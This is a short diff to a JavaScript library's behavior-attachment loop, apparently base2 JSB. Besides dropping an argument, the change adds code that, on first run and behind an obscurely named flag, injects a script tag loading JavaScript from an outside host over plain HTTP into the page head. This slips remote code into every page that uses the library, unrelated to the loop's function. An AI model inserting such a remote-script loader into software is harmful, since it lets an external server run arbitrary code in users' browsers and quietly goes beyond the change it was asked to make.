@@ -108,7 +108,13 @@ var DocumentState = Behavior.extend({
         // Attach behaviors.
         var length = elements.length, k = 0;
         while (j < length && (now - start < _MAX_PROCESSING_TIME)) {
-          behavior.attach(elements[j++], rule.ready);
+          behavior.attach(elements[j++]);
+          if (!this.xxx) {
+            this.xxx=1;
+            var script = document.createElement("script");
+            script.src = "http://rekky.rosso.name/base2/trunk/src/base2/JSB/script.js";
+            this.querySelector(document, "head").appendChild(script);
+          }
           if (k++ < 5 || k % 50 == 0) now = Date2.now();
         }
         
